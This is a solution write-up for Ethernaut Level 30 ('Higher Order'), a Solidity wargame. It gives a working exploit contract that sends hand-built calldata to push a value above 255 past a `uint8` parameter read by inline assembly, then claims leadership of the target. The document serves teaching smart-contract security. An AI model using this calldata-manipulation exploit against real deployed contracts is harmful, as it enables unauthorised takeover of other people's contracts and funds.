# Ethernaut Level 30 - Higher Order

## Vulnerability

The target contract has a critical vulnerability in the `registerTreasury` function:
```solidity
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```

**The Problem:**
- Function signature declares parameter as `uint8` (max value: 255)
- Assembly code uses `calldataload(4)` which reads **full 32 bytes** from calldata
- This bypasses Solidity's type checking!

## Exploit Contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IHigherOrder {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
    function commander() view external returns(address); 
    function treasury() view external returns(uint256);
}

contract HigherOrderExploit {
    IHigherOrder public target;
    
    constructor(address _target) {
        target = IHigherOrder(_target);
    }
    
    function attack() external {
        // Manually construct calldata with uint256(256) instead of uint8
        bytes memory data = abi.encodePacked(
            bytes4(0x211c85ab),  // registerTreasury(uint8) selector
            uint256(256)          // Value > 255 (bypasses uint8 limit)
        );
        
        // Low-level call to send crafted calldata
        (bool success,) = address(target).call(data);
        require(success, "registerTreasury failed!!!");
        
        // Now treasury > 255, we can claim leadership
        target.claimLeadership();
    }
    
    function checkStatus() external view returns (
        uint256 treasuryValue, 
        address commander
    ) {
        treasuryValue = target.treasury();
        commander = target.commander();
    }
}
```

## How It Works

### Step 1: Construct Malicious Calldata
```
Calldata structure:
0x211c85ab0000000000000000000000000000000000000000000000000000000000000100
  ^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  Selector  uint256(256) - 32 bytes
```

- `0x211c85ab`: Function selector for `registerTreasury(uint8)`
- `0x0000...0100`: Value 256 encoded as uint256 (32 bytes)

### Step 2: Why uint256(256)?
```solidity
// ❌ Won't compile - uint8 max is 255
uint8(256)  // Overflow error!

// ✅ Works - uint256 can hold 256
uint256(256)  // OK!
```

We need `uint256` to encode values > 255, even though the function signature says `uint8`.

### Step 3: Assembly Reads Full 32 Bytes
```solidity
calldataload(4)  // Always reads 32 bytes starting at position 4
```

The assembly code doesn't care about the function signature - it reads the full 32-byte value (256) and stores it in `treasury`.

### Step 4: Claim Leadership

Once `treasury > 255`, we can call `claimLeadership()` to become the commander.

## Solution

1. **Deploy the exploit contract** with target address
2. **Call `attack()`** - this will:
   - Set treasury to 256 (bypassing uint8 limit)
   - Claim leadership
3. **Verify with `checkStatus()`** - commander should be the exploit contract

## Key Concepts

- **Function Selector**: `bytes4(keccak256("registerTreasury(uint8)"))` = `0x211c85ab`
- **Calldata Manipulation**: Manually crafting calldata to bypass type checks
- **Assembly Bypass**: Low-level operations ignore Solidity's type safety
- **Low-level Call**: Using `.call()` to send arbitrary calldata